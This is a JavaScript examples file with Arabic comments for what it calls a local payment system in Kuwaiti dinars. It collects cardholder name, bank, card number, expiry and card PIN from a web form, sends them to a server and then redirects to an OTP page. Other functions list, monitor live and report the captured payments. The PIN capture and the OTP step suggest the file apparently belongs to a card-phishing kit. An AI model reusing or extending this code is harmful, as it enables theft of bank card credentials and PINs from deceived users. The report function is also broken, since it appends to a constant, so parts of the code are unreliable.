/**
 * 📚 أمثلة متقدمة على استخدام نظام الدفع المحلي
 * يمكنك نسخ الأمثلة واستخدامها مباشرة
 */

// ==================== مثال 1: إرسال دفعة بسيطة ====================

async function example1_SimplePayment() {
    const paymentData = {
        name: "محمد أحمد",
        bank: "NBK",
        prefix: "464452",
        cardNumber: "1234567890",
        expiryMonth: "12",
        expiryYear: "25",
        pin: "1234",
        amount: "50"
    };

    const result = await sendPaymentToServer(paymentData);
    
    if (result.success) {
        console.log("✅ تم الإرسال بنجاح - المعرّف:", result.paymentId);
    } else {
        console.error("❌ فشل الإرسال:", result.message);
    }
}

// ==================== مثال 2: إنشاء طلب ====================

async function example2_CreateOrder() {
    const orderData = {
        items: [
            { id: 1, name: "منتج 1", price: 25, quantity: 2 },
            { id: 2, name: "منتج 2", price: 50, quantity: 1 }
        ],
        totalAmount: 100,
        customerName: "فاطمة محمود",
        customerPhone: "+96598765432"
    };

    const result = await createOrder(orderData);
    
    if (result.success) {
        console.log("✅ تم إنشاء الطلب - المعرّف:", result.orderId);
    } else {
        console.error("❌ فشل إنشاء الطلب:", result.message);
    }
}

// ==================== مثال 3: الحصول على جميع المدفوعات ====================

async function example3_GetAllPayments() {
    const payments = await getPayments();
    
    console.log("عدد المدفوعات:", payments.length);
    
    payments.forEach(payment => {
        console.log(`
            المعرّف: ${payment.id}
            العميل: ${payment.customerName}
            البنك: ${payment.bank}
            المبلغ: ${payment.amount} KD
            الحالة: ${payment.status}
            التاريخ: ${new Date(payment.timestamp).toLocaleString('ar-SA')}
        `);
    });
}

// ==================== مثال 4: الحصول على إحصائيات لوحة التحكم ====================

async function example4_GetStats() {
    const stats = await getDashboardStats();
    
    if (stats) {
        console.log(`
            📊 الإحصائيات:
            ─────────────────
            إجمالي الطلبات: ${stats.totalOrders}
            إجمالي المدفوعات: ${stats.totalPayments}
            المدفوعات المعلقة: ${stats.pendingPayments}
            المدفوعات المكتملة: ${stats.completedPayments}
            المدفوعات الفاشلة: ${stats.failedPayments}
            إجمالي المبلغ: ${stats.totalAmount} KD
        `);
    }
}

// ==================== مثال 5: تحديث حالة دفعة ====================

async function example5_UpdatePaymentStatus(paymentId, newStatus) {
    const result = await updatePaymentStatus(paymentId, newStatus);
    
    if (result.success) {
        console.log("✅ تم التحديث بنجاح");
        console.log("البيانات الجديدة:", result.data);
    } else {
        console.error("❌ فشل التحديث:", result.message);
    }
}

// ==================== مثال 6: نموذج دفع متقدم مع معالجة أخطاء ====================

async function example6_AdvancedPaymentForm() {
    try {
        // الحصول على البيانات من النموذج
        const name = document.getElementById("customerName")?.value;
        const bank = document.getElementById("bankSelect")?.value;
        const cardNumber = document.getElementById("cardNumber")?.value;
        const pin = document.getElementById("pin")?.value;
        const amount = localStorage.getItem("totalAmount") || "0";

        // التحقق من البيانات
        if (!name || !bank || !cardNumber || !pin) {
            throw new Error("جميع الحقول مطلوبة");
        }

        if (cardNumber.length !== 10) {
            throw new Error("رقم البطاقة يجب أن يكون 10 أرقام");
        }

        if (parseFloat(amount) <= 0) {
            throw new Error("المبلغ يجب أن يكون أكبر من صفر");
        }

        // إرسال الدفعة
        const paymentData = {
            name: name,
            bank: bank,
            prefix: document.getElementById("prefixSelect")?.value || "",
            cardNumber: cardNumber,
            expiryMonth: document.getElementById("monthSelect")?.value || "",
            expiryYear: document.getElementById("yearSelect")?.value || "",
            pin: pin,
            amount: amount
        };

        const result = await sendPaymentToServer(paymentData);

        if (result.success) {
            // تعديل واجهة المستخدم
            showSuccessMessage(`✅ تم إرسال الدفعة!\nمعرّف: ${result.paymentId}`);
            
            // إعادة تعيين النموذج
            document.getElementById("paymentForm")?.reset();
            
            // الانتقال إلى الصفحة التالية بعد ثانيتين
            setTimeout(() => {
                window.location.href = "otpkpay.html";
            }, 2000);
        } else {
            showErrorMessage(`❌ خطأ: ${result.message}`);
        }

    } catch (error) {
        showErrorMessage(`❌ خطأ: ${error.message}`);
    }
}

// ==================== مثال 7: مراقبة المدفوعات الحية ====================

function example7_MonitorPaymentsLive() {
    // تحديث كل 3 ثواني
    setInterval(async () => {
        const payments = await getPayments();
        const stats = await getDashboardStats();

        // تحديث الواجهة
        if (document.getElementById("payment-count")) {
            document.getElementById("payment-count").textContent = payments.length;
        }

        if (document.getElementById("total-amount")) {
            document.getElementById("total-amount").textContent = 
                stats.totalAmount.toFixed(2) + " KD";
        }

        // إضافة آخر دفعة إلى الجدول
        if (payments.length > 0) {
            const latestPayment = payments[payments.length - 1];
            console.log("📲 آخر دفعة:", latestPayment.customerName);
        }
    }, 3000); // كل 3 ثواني
}

// ==================== مثال 8: تقارير مفصلة ====================

async function example8_GenerateReport() {
    const payments = await getPayments();
    const orders = await getOrders();
    const stats = await getDashboardStats();

    const report = `
╔════════════════════════════════════════╗
║          تقرير شامل                    ║
║     ${new Date().toLocaleString('ar-SA')}         ║
╚════════════════════════════════════════╝

📊 الإحصائيات الرئيسية:
────────────────────────────────────────
• إجمالي الطلبات: ${stats.totalOrders}
• إجمالي المدفوعات: ${stats.totalPayments}
• المبلغ الإجمالي: ${stats.totalAmount} KD
• متوسط الدفعة: ${(stats.totalAmount / (stats.totalPayments || 1)).toFixed(2)} KD

📋 توزيع الحالات:
────────────────────────────────────────
• مكتملة: ${stats.completedPayments}
• معلقة: ${stats.pendingPayments}
• فاشلة: ${stats.failedPayments}

💳 أكثر البنوك استخداماً:
────────────────────────────────────────`;

    // حساب البنوك الأكثر استخداماً
    const bankCounts = {};
    payments.forEach(p => {
        bankCounts[p.bank] = (bankCounts[p.bank] || 0) + 1;
    });

    Object.entries(bankCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
        .forEach(([bank, count]) => {
            report += `\n• ${bank}: ${count} دفعة`;
        });

    report += `\n\n📅 آخر 5 دفعات:
────────────────────────────────────────`;

    payments.slice(-5).reverse().forEach(p => {
        report += `
• ${p.customerName} - ${p.amount} KD (${p.status})
  التاريخ: ${new Date(p.timestamp).toLocaleString('ar-SA')}`;
    });

    console.log(report);
    return report;
}

// ==================== دوال مساعدة ====================

function showSuccessMessage(message) {
    // إظهار رسالة نجاح
    const div = document.createElement('div');
    div.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #4CAF50;
        color: white;
        padding: 20px;
        border-radius: 8px;
        z-index: 9999;
        font-size: 16px;
    `;
    div.textContent = message;
    document.body.appendChild(div);
    
    setTimeout(() => div.remove(), 3000);
}

function showErrorMessage(message) {
    // إظهار رسالة خطأ
    const div = document.createElement('div');
    div.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #f44336;
        color: white;
        padding: 20px;
        border-radius: 8px;
        z-index: 9999;
        font-size: 16px;
    `;
    div.textContent = message;
    document.body.appendChild(div);
    
    setTimeout(() => div.remove(), 3000);
}

// ==================== تشغيل الأمثلة ====================

/*
لتشغيل أي مثال، افتح console المتصفح واكتب:

example1_SimplePayment()
example2_CreateOrder()
example3_GetAllPayments()
example4_GetStats()
example5_UpdatePaymentStatus('payment-id-here', 'completed')
example6_AdvancedPaymentForm()
example7_MonitorPaymentsLive()
example8_GenerateReport()
*/

console.log(`
✅ تم تحميل الأمثلة المتقدمة بنجاح!

📝 الأمثلة المتاحة:
1. example1_SimplePayment() - إرسال دفعة
2. example2_CreateOrder() - إنشاء طلب
3. example3_GetAllPayments() - عرض المدفوعات
4. example4_GetStats() - الإحصائيات
5. example5_UpdatePaymentStatus() - تحديث الحالة
6. example6_AdvancedPaymentForm() - نموذج متقدم
7. example7_MonitorPaymentsLive() - مراقبة حية
8. example8_GenerateReport() - تقرير شامل

اكتب اسم الدالة في console وهي ستُنفذ تلقائياً!
`);
